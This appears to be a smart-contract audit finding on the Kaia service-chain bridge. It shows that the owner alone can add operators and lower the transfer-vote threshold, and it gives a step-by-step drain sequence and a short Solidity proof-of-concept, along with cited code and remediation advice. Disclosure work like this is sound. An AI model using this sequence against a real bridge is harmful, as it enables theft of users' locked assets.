### Title
Bridge Owner Possesses Unilateral Control Over Operator Set and Threshold, Enabling Complete Drain of Locked Assets — (`contracts/service_chain/bridge/BridgeOperator.sol`)

---

### Summary

The Kaia service-chain `Bridge` contract inherits `BridgeOperator`, which grants the contract owner sole, immediate authority to add/remove operators and to set the `ValueTransfer` threshold. Even after a multi-operator configuration is established by users, the owner can atomically lower the threshold to 1, inject a controlled operator, and call `handleKLAYTransfer` / `handleERC20Transfer` / `handleERC721Transfer` to drain every asset locked in the bridge — with no time-lock, no operator counter-vote, and no user-revocable protection.

---

### Finding Description

`BridgeOperator.sol` exposes three `onlyOwner` functions that together control the entire security model of the bridge:

```solidity
// BridgeOperator.sol L135-L144
function registerOperator(address _operator) external onlyOwner {
    require(operatorList.length < MAX_OPERATOR, "max operator limit");
    require(!operators[_operator], "exist operator");
    operators[_operator] = true;
    operatorList.push(_operator);
}

// BridgeOperator.sol L159-L174
function deregisterOperator(address _operator) external onlyOwner { ... }

// BridgeOperator.sol L177-L185
function setOperatorThreshold(VoteType _voteType, uint8 _threshold) external onlyOwner {
    require(_threshold > 0, "zero threshold");
    require(operatorList.length >= _threshold, "bigger than num of operators");
    operatorThresholds[uint8(_voteType)] = _threshold;
}
```

The `handleKLAYTransfer` function (and its ERC20/ERC721 counterparts) releases locked assets when `_voteValueTransfer` returns `true`, which happens as soon as `voteCounts[voteKey] >= operatorThresholds[ValueTransfer]`:

```solidity
// BridgeTransferKLAY.sol L62-L99
function handleKLAYTransfer(...) public onlyOperators nonReentrant {
    _lowerHandleNonceCheck(_requestedNonce);
    if (!_voteValueTransfer(_requestedNonce)) { return; }
    ...
    (bool ok, ) = _to.call.value(_value)("");
    require(ok, "handleKLAYTransfer: transfer failed");
}
```

`setFeeReceiver` is also exclusively `onlyOwner` with no operator vote:

```solidity
// BridgeTransfer.sol L163-L168
function setFeeReceiver(address payable _feeReceiver) external onlyOwner {
    _setFeeReceiver(_feeReceiver);
}
```

**Concrete attack sequence** (after a legitimate multi-operator setup):

1. Legitimate deployment: owner registers op1, op2, op3; deregisters self; sets `ValueTransfer` threshold to 2.
2. Users lock KLAY/ERC20/ERC721 in the bridge, trusting the 2-of-3 operator model.
3. Owner calls `registerOperator(attackerAddr)` — no operator vote required.
4. Owner calls `setOperatorThreshold(ValueTransfer, 1)` — no operator vote required.
5. `attackerAddr` calls `handleKLAYTransfer(anyTxHash, anyFrom, attackerAddr, bridgeBalance, freshNonce, anyBlock, "")` — passes `onlyOperators` and the now-threshold-1 vote, draining the bridge.

The same sequence applies to ERC20 (`handleERC20Transfer`) and ERC721 (`handleERC721Transfer`).

---

### Impact Explanation

All KAIA and bridged ERC20/ERC721 tokens held by the bridge contract can be transferred to an arbitrary address in a single block. The `closedValueTransferVotes` nonce guard only prevents replay of the *same* nonce; a fresh nonce bypasses it entirely. There is no time-lock, no user-revocable approval, and no on-chain mechanism for users to exit before the attack completes.

---

### Likelihood Explanation

The bridge owner key is a single point of failure. A successful phishing attack, private-key compromise, or insider threat against the bridge operator is sufficient. The attack requires only two owner transactions (`registerOperator` + `setOperatorThreshold`) followed by one operator transaction (`handleKLAYTransfer`), all executable within the same block. Users have no on-chain recourse once the threshold is lowered because `revokeApproval`-style protections do not exist in this bridge design.

---

### Recommendation

1. **Require operator multi-sig for threshold and operator-set changes.** Route `registerOperator`, `deregisterOperator`, and `setOperatorThreshold` through `_voteConfiguration` so that changing the security model itself requires the existing operator quorum.
2. **Introduce a time-lock** on operator-set and threshold changes, giving users a window to exit before a malicious change takes effect.
3. **Separate the owner role from the security-parameter role.** Use a governance contract or multi-sig wallet as the owner, so no single key can unilaterally alter the operator set.
4. **Emit events and enforce a minimum delay** between `setOperatorThreshold` and its effective application, analogous to a guardian pattern.

---

### Proof of Concept

```solidity
// Assume bridge is deployed, op1/op2/op3 registered, owner deregistered, threshold=2.
// Bridge holds 100 KLAY.

address attacker = address(0xDEAD);

// Step 1: owner injects attacker as operator (no vote needed)
bridge.registerOperator(attacker);          // onlyOwner, succeeds immediately

// Step 2: owner lowers threshold to 1 (no vote needed)
bridge.setOperatorThreshold(VoteType.ValueTransfer, 1);  // onlyOwner, succeeds immediately

// Step 3: attacker drains bridge in a single call
vm.prank(attacker);
bridge.handleKLAYTransfer(
    bytes32(uint256(999)),  // fresh txHash — not in closedValueTransferVotes
    address(0),             // _from (irrelevant)
    payable(attacker),      // _to
    100 ether,              // _value = full bridge balance
    999,                    // _requestedNonce (fresh, passes lowerHandleNonce check)
    block.number,
    ""
);
// attacker now holds 100 KLAY; bridge balance = 0
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** contracts/service_chain/bridge/BridgeOperator.sol (L54-61)
```text
    constructor() internal {
        for (uint8 i = 0; i < uint8(VoteType.Max); i++) {
            operatorThresholds[uint8(i)] = 1;
        }

        operators[msg.sender] = true;
        operatorList.push(msg.sender);
    }
```

**File:** contracts/service_chain/bridge/BridgeOperator.sol (L96-99)
```text
        if (vote.voteCounts[_voteKey] >= operatorThresholds[uint8(_voteType)]) {
            return true;
        }
        return false;
```

**File:** contracts/service_chain/bridge/BridgeOperator.sol (L134-144)
```text
    // registerOperator registers a new operator.
    function registerOperator(address _operator)
    external
    onlyOwner
    {
        require(operatorList.length < MAX_OPERATOR, "max operator limit");
        require(!operators[_operator], "exist operator");
        operators[_operator] = true;
        operatorList.push(_operator);
        emit OperatorRegistered(_operator);
    }
```

**File:** contracts/service_chain/bridge/BridgeOperator.sol (L176-185)
```text
    // setOperatorThreshold sets the operator threshold.
    function setOperatorThreshold(VoteType _voteType, uint8 _threshold)
    external
    onlyOwner
    {
        require(_threshold > 0, "zero threshold");
        require(operatorList.length >= _threshold, "bigger than num of operators");
        operatorThresholds[uint8(_voteType)] = _threshold;
        emit OperatorThresholdChanged(_voteType, _threshold);
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L62-99)
```text
    function handleKLAYTransfer(
        bytes32 _requestTxHash,
        address _from,
        address payable _to,
        uint256 _value,
        uint64 _requestedNonce,
        uint64 _requestedBlockNumber,
        bytes memory _extraData
    )
        public
        onlyOperators
        nonReentrant
    {
        _lowerHandleNonceCheck(_requestedNonce);

        if (!_voteValueTransfer(_requestedNonce)) {
            return;
        }

        _setHandledRequestTxHash(_requestTxHash);

        handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
        _updateHandleNonce(_requestedNonce);

        emit HandleValueTransfer(
            _requestTxHash,
            TokenType.KLAY,
            _from,
            _to,
            address(0),
            _value,
            _requestedNonce,
            lowerHandleNonce,
            _extraData
        );

        (bool ok, ) = _to.call.value(_value)("");
        require(ok, "handleKLAYTransfer: transfer failed");
```

**File:** contracts/service_chain/bridge/BridgeTransfer.sol (L162-168)
```text
    // setFeeReceivers sets fee receiver.
    function setFeeReceiver(address payable _feeReceiver)
        external
        onlyOwner
    {
        _setFeeReceiver(_feeReceiver);
    }
```
